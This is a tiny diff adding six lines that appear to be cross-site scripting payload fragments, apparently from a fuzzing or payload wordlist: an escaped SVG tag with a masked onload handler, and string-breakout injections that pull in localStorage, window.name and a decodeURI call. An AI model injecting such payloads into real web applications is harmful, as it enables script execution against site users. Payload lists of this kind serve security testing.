@@ -1,0 +1,6 @@
+####|####|####|####|####|
+\x3csvg onload=******\x3e
+"+localStorage["hash"]+"
+"+decodeURI`+"
+"+window["name"]+"
+"+name+"
